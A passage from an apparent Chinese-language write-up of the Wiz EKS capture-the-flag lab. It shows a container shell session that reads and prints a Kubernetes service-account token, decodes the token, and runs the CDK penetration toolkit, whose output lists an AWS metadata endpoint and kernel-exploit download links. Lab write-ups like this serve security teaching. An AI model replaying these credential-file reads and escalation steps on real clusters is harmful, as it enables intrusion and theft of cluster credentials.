class="number">36</span>:*.<span class="property">spx</span>=<span class="number">00</span>;<span class="number">36</span>:*.<span class="property">xspf</span>=<span class="number">00</span>;<span class="number">36</span>:</span><br><span class="line"><span class="variable constant_">LESSCLOSE</span>=<span class="regexp">/bin/</span>lesspipe %s %s</span><br><span class="line"><span class="variable constant_">TERM</span>=xterm-256color</span><br><span class="line"><span class="variable constant_">LESSOPEN</span>=| <span class="regexp">/bin/</span>lesspipe %s</span><br><span class="line"><span class="variable constant_">SHLVL</span>=<span class="number">2</span></span><br><span class="line"><span class="variable constant_">PATH</span>=<span class="regexp">/bin/</span>:<span class="regexp">/usr/</span><span class="attr">bin</span>:<span class="regexp">/usr/</span>local/<span class="attr">bin</span>:<span class="regexp">/usr/</span>sbin</span><br><span class="line">_=<span class="regexp">/bin/</span>env</span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# ls /run</span><br><span class="line">lock  mount  systemd</span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# ls /runlock</span><br><span class="line"><span class="attr">ls</span>: cannot access <span class="string">&#x27;/runlock&#x27;</span>: <span class="title class_">No</span> such file or directory</span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# ls /run/lock</span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# ls /</span><br><span class="line">banner.<span class="property">txt</span>  bin  boot  challenge.<span class="property">sh</span>  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  <span class="keyword">var</span></span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# cat /banner.<span class="property">txt</span> </span><br><span class="line">__        ___       _____ _  ______</span><br><span class="line">\ \      / (_)____ | ____| |<span class="regexp">/ /</span> ___|</span><br><span class="line"> \ \ /\ / <span class="regexp">/| |_  /</span> |  _| | <span class="string">&#x27; /\___ \</span></span><br><span class="line"><span class="string">  \ V  V / | |/ /  | |___| . \ ___) |</span></span><br><span class="line"><span class="string">   \_/\_/  |_/___| |_____|_|\_\____/</span></span><br><span class="line"><span class="string">  ____ _           _ _</span></span><br><span class="line"><span class="string"> / ___| |__   __ _| | | ___ _ __   __ _  ___</span></span><br><span class="line"><span class="string">| |   | &#x27;</span>_ \ / _<span class="string">` | | |/ _ \ &#x27;_ \ / _`</span> |/ _ \</span><br><span class="line">| |___| | | | (_| | | |  __/ | | | (_| |  __/</span><br><span class="line"> \____|_| |_|\__,_|_|_|\___|_| |_|\__, |\___|</span><br><span class="line">                                  |___/</span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# cat /challenge.<span class="property">sh</span> </span><br><span class="line">#!<span class="regexp">/bin/</span>bash</span><br><span class="line">cat /banner.<span class="property">txt</span></span><br><span class="line">cat &lt;&lt; <span class="variable constant_">EOF</span></span><br><span class="line"><span class="title class_">Welcome</span> to <span class="title class_">Wiz</span> <span class="variable constant_">EKS</span> <span class="title class_">Challenge</span>!</span><br><span class="line"><span class="title class_">For</span> your convenience, the following directories are persistent across <span class="attr">sessions</span>:</span><br><span class="line">        * <span class="regexp">/home/u</span>ser</span><br><span class="line">        * /tmp</span><br><span class="line"></span><br><span class="line"><span class="title class_">Use</span> kubectl to start!</span><br><span class="line"><span class="variable constant_">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="variable constant_">PATH</span>=<span class="regexp">/bin/</span>:<span class="regexp">/usr/</span><span class="attr">bin</span>:<span class="regexp">/usr/</span>local/<span class="attr">bin</span>:<span class="regexp">/usr/</span>sbin</span><br><span class="line"><span class="keyword">export</span> <span class="variable constant_">HOME</span>=<span class="regexp">/home/u</span>ser</span><br><span class="line">cp -n /etc/skel/.<span class="property">bashrc</span> ~/</span><br><span class="line">kubectl config set-cluster localcfg --server=<span class="attr">https</span>:<span class="comment">//10.100.0.1 --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt &amp;&gt;/dev/null</span></span><br><span class="line">kubectl config set-credentials user --token $(cat /<span class="keyword">var</span>/run/secrets/kubernetes.<span class="property">io</span>/serviceaccount/token) &amp;&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line">kubectl config set-context localcfg --cluster=localcfg --user=user --namespace=$(cat /<span class="keyword">var</span>/run/secrets/kubernetes.<span class="property">io</span>/serviceaccount/namespace) &amp;&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line">kubectl config use-context localcfg &amp;&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line">cp /home/user/.<span class="property">kube</span>/config /home/user/.<span class="property">kube</span>/config.<span class="property">bak</span> <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line">chmod <span class="number">400</span> /home/user/.<span class="property">kube</span>/config.<span class="property">bak</span></span><br><span class="line">bashroot@wiz-eks-<span class="attr">challenge</span>:~# ls /car</span><br><span class="line"><span class="attr">ls</span>: cannot access <span class="string">&#x27;/car&#x27;</span>: <span class="title class_">No</span> such file or directory</span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# ls /<span class="keyword">var</span></span><br><span class="line">backups  cache  lib  local  lock  log  mail  opt  run  spool  tmp</span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# ls /<span class="keyword">var</span>/run</span><br><span class="line">secrets</span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# ls /<span class="keyword">var</span>/run/secrets/</span><br><span class="line">kubernetes.<span class="property">io</span></span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# ls /<span class="keyword">var</span>/run/secrets/kubernetes.<span class="property">io</span>/</span><br><span class="line">serviceaccount</span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# ls /<span class="keyword">var</span>/run/secrets/kubernetes.<span class="property">io</span>/serviceaccount/</span><br><span class="line">ca.<span class="property">crt</span>  namespace  token</span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# ls /<span class="keyword">var</span>/run/secrets/kubernetes.<span class="property">io</span>/serviceaccount/token</span><br><span class="line">/<span class="keyword">var</span>/run/secrets/kubernetes.<span class="property">io</span>/serviceaccount/token</span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# cat /<span class="keyword">var</span>/run/secrets/kubernetes.<span class="property">io</span>/serviceaccount/token</span><br><span class="line">eyJhbGciOiJSUzI1NiIsImtpZCI6ImI4YzE2MTEwNzZiMzY5ZjRmYTQ1YTYxODU3YmE3NGQ0ZjU4YWFkMGQifQ.<span class="property">eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjIl0sImV4cCI6MTc1MjAzMDY3MSwiaWF0IjoxNzUyMDI3MDcxLCJpc3MiOiJodHRwczovL29pZGMuZWtzLnVzLXdlc3QtMS5hbWF6b25hd3MuY29tL2lkL0MwNjJDMjA3QzhGNTBERTRFQzI0QTM3MkZGNjBFNTg5Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJjaGFsbGVuZ2UxIiwic2VydmljZWFjY291bnQiOnsibmFtZSI6InNlcnZpY2UtYWNjb3VudC1jaGFsbGVuZ2UxIiwidWlkIjoiYjQyMTc5YTYtMjM4Yi00ZDQ2LThkNjAtNDhkNzRkN2MxNDVlIn19LCJuYmYiOjE3NTIwMjcwNzEsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpjaGFsbGVuZ2UxOnNlcnZpY2UtYWNjb3VudC1jaGFsbGVuZ2UxIn0</span>.<span class="property">cq9CNxTh0BES4YpJYzA_UCcRV2KtlN8ps7bNK0vKlgetdfzpCm_rou4g0z67IFoqpw7wV4cj</span>-<span class="title class_">DIlizytnp3DIpGfl</span>20H-5XZnSapHxPQFFcAnCLZ2T20eVdqJK1jUCyhsz1afZU-J8ia9sIYcoy4yFGVPz-<span class="title class_">BwhNj7</span>iBhC9P7Dk8TZBosdG70bq-<span class="title class_">DxnkIJin8Tv1</span>_nIHv5ert4R1pm1HXm2x1ohQrJ-<span class="title class_">Ho7</span>gCG3LIiXbNcqqwIuW34-nqq19Z3C5E-8JGvoRLIUe0z0SEVJsqF7sUhD7pROr4MRu6jas5Jxc6w6X7NGlDxtxdicxRfbMWB9i2U4X6bH9j_9cpflgRVlQ</span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# </span><br></pre></td></tr></table></figure>

<p>一番信息收集下来，发现其实应该就是用之前写的文章k8s集群攻击手法（上）的第一part：利用Token&#x2F;Secret类攻击k8s集群</p>
<p>这个token解密payload部分其实是可以获取到很多信息的，我们来看</p>
<p><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/imageqwtqt.png?imageSlim" alt="image.png"></p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;aud&quot;</span>: [<span class="string">&quot;https://kubernetes.default.svc&quot;</span>],</span><br><span class="line">  <span class="string">&quot;exp&quot;</span>: <span class="number">1752030671</span>,</span><br><span class="line">  <span class="string">&quot;iat&quot;</span>: <span class="number">1752027071</span>,</span><br><span class="line">  <span class="string">&quot;nbf&quot;</span>: <span class="number">1752027071</span>,</span><br><span class="line">  <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;https://oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589&quot;</span>,</span><br><span class="line">  <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;system:serviceaccount:challenge1:service-account-challenge1&quot;</span>,</span><br><span class="line">  <span class="string">&quot;kubernetes.io&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;namespace&quot;</span>: <span class="string">&quot;challenge1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;serviceaccount&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;service-account-challenge1&quot;</span>,</span><br><span class="line">      <span class="string">&quot;uid&quot;</span>: <span class="string">&quot;b42179a6-238b-4d46-8d60-48d74d7c145e&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>那么通过这个可以知道</p>
<ul>
<li>iss写了是eks托管的k8s集群</li>
<li>system:serviceaccount:<namespace>:<sa-name>可以知道命名空间challenge1以及服务账户service-account-challenge1</li>
</ul>
<p>下一步思路：知道了命名空间，那么继续信息收集该命名空间下的Pod、Secret、ConfigMap这些东西</p>
<p>这里我先用CDK信息收集一下，用法看这里:<a target="_blank" rel="noopener" href="https://github.com/cdk-team/CDK/wiki/CDK-Home-CN">https://github.com/cdk-team/CDK/wiki/CDK-Home-CN</a></p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# ./cdk_linux_amd64 evaluate --full</span><br><span class="line"><span class="title function_">CDK</span> (<span class="title class_">Container</span> <span class="title class_">DucK</span>)</span><br><span class="line"><span class="variable constant_">CDK</span> <span class="title class_">Version</span>(<span class="title class_">GitCommit</span>): b4105424a2f329020c388e6e16a42e9bb31ef501</span><br><span class="line"><span class="title class_">Zero</span>-dependency cloudnative k8s/docker/serverless penetration toolkit by cdxy &amp; neargle</span><br><span class="line"><span class="title class_">Find</span> tutorial, configuration and use-<span class="keyword">case</span> <span class="keyword">in</span> <span class="attr">https</span>:<span class="comment">//github.com/cdk-team/CDK/</span></span><br><span class="line"></span><br><span class="line">[  <span class="title class_">Information</span> <span class="title class_">Gathering</span> - <span class="title class_">System</span> <span class="title class_">Info</span>  ]</span><br><span class="line"><span class="number">2025</span>/<span class="number">07</span>/<span class="number">09</span> <span class="number">03</span>:<span class="number">13</span>:<span class="number">24</span> current <span class="attr">dir</span>: <span class="regexp">/home/u</span>ser</span><br><span class="line"><span class="number">2025</span>/<span class="number">07</span>/<span class="number">09</span> <span class="number">03</span>:<span class="number">13</span>:<span class="number">24</span> current <span class="attr">user</span>: root <span class="attr">uid</span>: <span class="number">0</span> <span class="attr">gid</span>: <span class="number">0</span> <span class="attr">home</span>: /root</span><br><span class="line"><span class="number">2025</span>/<span class="number">07</span>/<span class="number">09</span> <span class="number">03</span>:<span class="number">13</span>:<span class="number">24</span> <span class="attr">hostname</span>: wiz-eks-challenge</span><br><span class="line"><span class="number">2025</span>/<span class="number">07</span>/<span class="number">09</span> <span class="number">03</span>:<span class="number">13</span>:<span class="number">24</span> debian ubuntu <span class="number">22.04</span> <span class="attr">kernel</span>: <span class="number">5.10</span><span class="number">.192</span>-<span class="number">183.736</span>.<span class="property">amzn2</span>.<span class="property">x86_64</span></span><br><span class="line"></span><br><span class="line">[  <span class="title class_">Information</span> <span class="title class_">Gathering</span> - <span class="title class_">Services</span>  ]</span><br><span class="line"></span><br><span class="line">[  <span class="title class_">Information</span> <span class="title class_">Gathering</span> - <span class="title class_">Commands</span> and <span class="title class_">Capabilities</span>  ]</span><br><span class="line"><span class="number">2025</span>/<span class="number">07</span>/<span class="number">09</span> <span class="number">03</span>:<span class="number">13</span>:<span class="number">24</span> available <span class="attr">commands</span>:</span><br><span class="line">        curl,wget,kubectl,find,ps,apt,dpkg,vi,mount,base64,perl</span><br><span class="line"><span class="number">2025</span>/<span class="number">07</span>/<span class="number">09</span> <span class="number">03</span>:<span class="number">13</span>:<span class="number">24</span> <span class="title class_">Capabilities</span> hex <span class="keyword">of</span> <span class="title class_">Caps</span>(<span class="title class_">CapInh</span>|<span class="title class_">CapPrm</span>|<span class="title class_">CapEff</span>|<span class="title class_">CapBnd</span>|<span class="title class_">CapAmb</span>):</span><br><span class="line">        <span class="title class_">CapInh</span>: <span class="number">0000000000000000</span></span><br><span class="line">        <span class="title class_">CapPrm</span>: <span class="number">0000000000000000</span></span><br><span class="line">        <span class="title class_">CapEff</span>: <span class="number">0000000000000000</span></span><br><span class="line">        <span class="title class_">CapBnd</span>: <span class="number">0000000000000000</span></span><br><span class="line">        <span class="title class_">CapAmb</span>: <span class="number">0000000000000000</span></span><br><span class="line">        <span class="title class_">Cap</span> <span class="attr">decode</span>: <span class="number">0x0000000000000000</span> = </span><br><span class="line">[*] <span class="title class_">Maybe</span> you can exploit the <span class="title class_">Capabilities</span> <span class="attr">below</span>:</span><br><span class="line"></span><br><span class="line">[  <span class="title class_">Information</span> <span class="title class_">Gathering</span> - <span class="title class_">Mounts</span>  ]</span><br><span class="line"><span class="number">259</span>:<span class="number">1</span> /<span class="keyword">var</span>/lib/kubelet/pods/32aacffb-2b37-<span class="number">4472</span>-b6e3-4397c184877b/volumes/kubernetes.<span class="property">io</span>~empty-dir/workdir/rootfs / ro,noatime - xfs /dev/nvme0n1p1 rw,attr2,inode64,logbufs=<span class="number">8</span>,logbsize=32k,noquota</span><br><span class="line"><span class="number">259</span>:<span class="number">1</span> /<span class="keyword">var</span>/lib/kubelet/pods/32aacffb-2b37-<span class="number">4472</span>-b6e3-4397c184877b/volumes/kubernetes.<span class="property">io</span>~empty-dir/workdir/storage/85ac6097-d19e-43c4-<span class="number">8235</span>-7f167074b23d/home /home/user rw,noatime - xfs /dev/nvme0n1p1 rw,attr2,inode64,logbufs=<span class="number">8</span>,logbsize=32k,noquota</span><br><span class="line"><span class="number">259</span>:<span class="number">1</span> /<span class="keyword">var</span>/lib/kubelet/pods/32aacffb-2b37-<span class="number">4472</span>-b6e3-4397c184877b/volumes/kubernetes.<span class="property">io</span>~empty-dir/workdir/storage/85ac6097-d19e-43c4-<span class="number">8235</span>-7f167074b23d/tmp /tmp rw,noatime - xfs /dev/nvme0n1p1 rw,attr2,inode64,logbufs=<span class="number">8</span>,logbsize=32k,noquota</span><br><span class="line"><span class="number">0</span>:<span class="number">150</span> /tmp/tmp.5y0iYHmcNS /<span class="keyword">var</span>/run/secrets/kubernetes.<span class="property">io</span>/serviceaccount/token ro,relatime - overlay overlay rw,lowerdir=<span class="regexp">/var/</span>lib/containerd/io.<span class="property">containerd</span>.<span class="property">snapshotter</span>.<span class="property">v1</span>.<span class="property">overlayfs</span>/snapshots/<span class="number">43</span>/fs,upperdir=<span class="regexp">/var/</span>lib/containerd/io.<span class="property">containerd</span>.<span class="property">snapshotter</span>.<span class="property">v1</span>.<span class="property">overlayfs</span>/snapshots/<span class="number">75</span>/fs,workdir=<span class="regexp">/var/</span>lib/containerd/io.<span class="property">containerd</span>.<span class="property">snapshotter</span>.<span class="property">v1</span>.<span class="property">overlayfs</span>/snapshots/<span class="number">75</span>/work</span><br><span class="line"><span class="number">0</span>:<span class="number">150</span> /tmp/tmp.<span class="property">mdobvgRIPo</span> /<span class="keyword">var</span>/run/secrets/kubernetes.<span class="property">io</span>/serviceaccount/namespace ro,relatime - overlay overlay rw,lowerdir=<span class="regexp">/var/</span>lib/containerd/io.<span class="property">containerd</span>.<span class="property">snapshotter</span>.<span class="property">v1</span>.<span class="property">overlayfs</span>/snapshots/<span class="number">43</span>/fs,upperdir=<span class="regexp">/var/</span>lib/containerd/io.<span class="property">containerd</span>.<span class="property">snapshotter</span>.<span class="property">v1</span>.<span class="property">overlayfs</span>/snapshots/<span class="number">75</span>/fs,workdir=<span class="regexp">/var/</span>lib/containerd/io.<span class="property">containerd</span>.<span class="property">snapshotter</span>.<span class="property">v1</span>.<span class="property">overlayfs</span>/snapshots/<span class="number">75</span>/work</span><br><span class="line"><span class="number">0</span>:<span class="number">150</span> /tmp/ca.<span class="property">crt</span> /<span class="keyword">var</span>/run/secrets/kubernetes.<span class="property">io</span>/serviceaccount/ca.<span class="property">crt</span> ro,relatime - overlay overlay rw,lowerdir=<span class="regexp">/var/</span>lib/containerd/io.<span class="property">containerd</span>.<span class="property">snapshotter</span>.<span class="property">v1</span>.<span class="property">overlayfs</span>/snapshots/<span class="number">43</span>/fs,upperdir=<span class="regexp">/var/</span>lib/containerd/io.<span class="property">containerd</span>.<span class="property">snapshotter</span>.<span class="property">v1</span>.<span class="property">overlayfs</span>/snapshots/<span class="number">75</span>/fs,workdir=<span class="regexp">/var/</span>lib/containerd/io.<span class="property">containerd</span>.<span class="property">snapshotter</span>.<span class="property">v1</span>.<span class="property">overlayfs</span>/snapshots/<span class="number">75</span>/work</span><br><span class="line"><span class="number">0</span>:<span class="number">153</span> /<span class="literal">null</span> /dev/<span class="literal">null</span> rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=<span class="number">755</span></span><br><span class="line"><span class="number">0</span>:<span class="number">153</span> /urandom /dev/urandom rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=<span class="number">755</span></span><br><span class="line"><span class="number">0</span>:<span class="number">290</span> / /proc ro,relatime - proc none rw</span><br><span class="line"></span><br><span class="line">[  <span class="title class_">Information</span> <span class="title class_">Gathering</span> - <span class="title class_">Net</span> <span class="title class_">Namespace</span>  ]</span><br><span class="line">        container net namespace isolated.</span><br><span class="line"></span><br><span class="line">[  <span class="title class_">Information</span> <span class="title class_">Gathering</span> - <span class="title class_">Sysctl</span> <span class="title class_">Variables</span>  ]</span><br><span class="line"><span class="number">2025</span>/<span class="number">07</span>/<span class="number">09</span> <span class="number">03</span>:<span class="number">13</span>:<span class="number">24</span> net.<span class="property">ipv4</span>.<span class="property">conf</span>.<span class="property">all</span>.<span class="property">route_localnet</span> = <span class="number">1</span></span><br><span class="line"><span class="number">2025</span>/<span class="number">07</span>/<span class="number">09</span> <span class="number">03</span>:<span class="number">13</span>:<span class="number">24</span> <span class="title class_">You</span> may be able to access the localhost service <span class="keyword">of</span> the current container node or other nodes.</span><br><span class="line"></span><br><span class="line">[  <span class="title class_">Information</span> <span class="title class_">Gathering</span> - <span class="variable constant_">DNS</span>-<span class="title class_">Based</span> <span class="title class_">Service</span> <span class="title class_">Discovery</span>  ]</span><br><span class="line">error when requesting <span class="attr">coreDNS</span>: lookup any.<span class="property">any</span>.<span class="property">svc</span>.<span class="property">cluster</span>.<span class="property">local</span>. on <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span>:<span class="number">53</span>: no such host</span><br><span class="line">error when requesting <span class="attr">coreDNS</span>: lookup any.<span class="property">any</span>.<span class="property">any</span>.<span class="property">svc</span>.<span class="property">cluster</span>.<span class="property">local</span>. on <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span>:<span class="number">53</span>: no such host</span><br><span class="line"></span><br><span class="line">[  <span class="title class_">Discovery</span> - K8s <span class="variable constant_">API</span> <span class="title class_">Server</span>  ]</span><br><span class="line"><span class="number">2025</span>/<span class="number">07</span>/<span class="number">09</span> <span class="number">03</span>:<span class="number">13</span>:<span class="number">24</span> checking <span class="keyword">if</span> api-server allows <span class="attr">system</span>:anonymous request.</span><br><span class="line">err found <span class="keyword">while</span> searching local K8s apiserver addr.:</span><br><span class="line"><span class="attr">err</span>: cannot find kubernetes api host <span class="keyword">in</span> <span class="variable constant_">ENV</span></span><br><span class="line">        api-server forbids anonymous request.</span><br><span class="line">        <span class="attr">response</span>:</span><br><span class="line"></span><br><span class="line">[  <span class="title class_">Discovery</span> - K8s <span class="title class_">Service</span> <span class="title class_">Account</span>  ]</span><br><span class="line">err found <span class="keyword">while</span> searching local K8s apiserver addr.:</span><br><span class="line"><span class="attr">err</span>: cannot find kubernetes api host <span class="keyword">in</span> <span class="variable constant_">ENV</span></span><br><span class="line"></span><br><span class="line">[  <span class="title class_">Discovery</span> - <span class="title class_">Cloud</span> <span class="title class_">Provider</span> <span class="title class_">Metadata</span> <span class="variable constant_">API</span>  ]</span><br><span class="line"><span class="number">2025</span>/<span class="number">07</span>/<span class="number">09</span> <span class="number">03</span>:<span class="number">13</span>:<span class="number">25</span> failed to dial <span class="title class_">Alibaba</span> <span class="title class_">Cloud</span> <span class="variable constant_">API</span>.</span><br><span class="line"><span class="number">2025</span>/<span class="number">07</span>/<span class="number">09</span> <span class="number">03</span>:<span class="number">13</span>:<span class="number">25</span> failed to dial <span class="title class_">Azure</span> <span class="variable constant_">API</span>.</span><br><span class="line"><span class="number">2025</span>/<span class="number">07</span>/<span class="number">09</span> <span class="number">03</span>:<span class="number">13</span>:<span class="number">25</span> failed to dial <span class="title class_">Google</span> <span class="title class_">Cloud</span> <span class="variable constant_">API</span>.</span><br><span class="line"><span class="number">2025</span>/<span class="number">07</span>/<span class="number">09</span> <span class="number">03</span>:<span class="number">13</span>:<span class="number">25</span> failed to dial <span class="title class_">Tencent</span> <span class="title class_">Cloud</span> <span class="variable constant_">API</span>.</span><br><span class="line"><span class="number">2025</span>/<span class="number">07</span>/<span class="number">09</span> <span class="number">03</span>:<span class="number">13</span>:<span class="number">25</span> failed to dial <span class="title class_">OpenStack</span> <span class="variable constant_">API</span>.</span><br><span class="line">        <span class="title class_">Amazon</span> <span class="title class_">Web</span> <span class="title class_">Services</span> (<span class="variable constant_">AWS</span>) <span class="title class_">Metadata</span> <span class="variable constant_">API</span> available <span class="keyword">in</span> <span class="attr">http</span>:<span class="comment">//169.254.169.254/latest/meta-data/</span></span><br><span class="line">        <span class="title class_">Docs</span>: <span class="attr">https</span>:<span class="comment">//docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html</span></span><br><span class="line"><span class="number">2025</span>/<span class="number">07</span>/<span class="number">09</span> <span class="number">03</span>:<span class="number">13</span>:<span class="number">26</span> failed to dial ucloud <span class="variable constant_">API</span>.</span><br><span class="line"></span><br><span class="line">[  <span class="title class_">Exploit</span> <span class="title class_">Pre</span> - <span class="title class_">Kernel</span> <span class="title class_">Exploits</span>  ]</span><br><span class="line"><span class="number">2025</span>/<span class="number">07</span>/<span class="number">09</span> <span class="number">03</span>:<span class="number">13</span>:<span class="number">26</span> <span class="attr">refer</span>: <span class="attr">https</span>:<span class="comment">//github.com/mzet-/linux-exploit-suggester</span></span><br><span class="line">[+] [<span class="variable constant_">CVE</span>-<span class="number">2021</span>-<span class="number">3490</span>] eBPF <span class="title class_">ALU32</span> bounds tracking <span class="keyword">for</span> bitwise ops</span><br><span class="line"></span><br><span class="line">   <span class="title class_">Details</span>: <span class="attr">https</span>:<span class="comment">//www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story</span></span><br><span class="line">   <span class="title class_">Exposure</span>: probable</span><br><span class="line">   <span class="title class_">Tags</span>: ubuntu=<span class="number">20.04</span>&#123;<span class="attr">kernel</span>:<span class="number">5.8</span><span class="number">.0</span>-(<span class="number">25</span>|<span class="number">26</span>|<span class="number">27</span>|<span class="number">28</span>|<span class="number">29</span>|<span class="number">30</span>|<span class="number">31</span>|<span class="number">32</span>|<span class="number">33</span>|<span class="number">34</span>|<span class="number">35</span>|<span class="number">36</span>|<span class="number">37</span>|<span class="number">38</span>|<span class="number">39</span>|<span class="number">40</span>|<span class="number">41</span>|<span class="number">42</span>|<span class="number">43</span>|<span class="number">44</span>|<span class="number">45</span>|<span class="number">46</span>|<span class="number">47</span>|<span class="number">48</span>|<span class="number">49</span>|<span class="number">50</span>|<span class="number">51</span>|<span class="number">52</span>)-*&#125;,ubuntu=<span class="number">21.04</span>&#123;<span class="attr">kernel</span>:<span class="number">5.11</span><span class="number">.0</span>-<span class="number">16</span>-*&#125;</span><br><span class="line">   <span class="title class_">Download</span> <span class="attr">URL</span>: <span class="attr">https</span>:<span class="comment">//codeload.github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490/zip/main</span></span><br><span class="line">   <span class="title class_">Comments</span>: <span class="variable constant_">CONFIG_BPF_SYSCALL</span> needs to be set &amp;&amp; kernel.<span class="property">unprivileged_bpf_disabled</span> != <span class="number">1</span></span><br><span class="line"></span><br><span class="line">[+] [<span class="variable constant_">CVE</span>-<span class="number">2022</span>-<span class="number">0847</span>] <span class="title class_">DirtyPipe</span></span><br><span class="line"></span><br><span class="line">   <span class="title class_">Details</span>: <span class="attr">https</span>:<span class="comment">//dirtypipe.cm4all.com/</span></span><br><span class="line">   <span class="title class_">Exposure</span>: less probable</span><br><span class="line">   <span class="title class_">Tags</span>: ubuntu=(<span class="number">20.04</span>|<span class="number">21.04</span>),debian=<span class="number">11</span></span><br><span class="line">   <span class="title class_">Download</span> <span class="attr">URL</span>: <span class="attr">https</span>:<span class="comment">//haxx.in/files/dirtypipez.c</span></span><br><span class="line"></span><br><span class="line">[+] [<span class="variable constant_">CVE</span>-<span class="number">2021</span>-<span class="number">27365</span>] linux-iscsi</span><br><span class="line"></span><br><span class="line">   <span class="title class_">Details</span>: <span class="attr">https</span>:<span 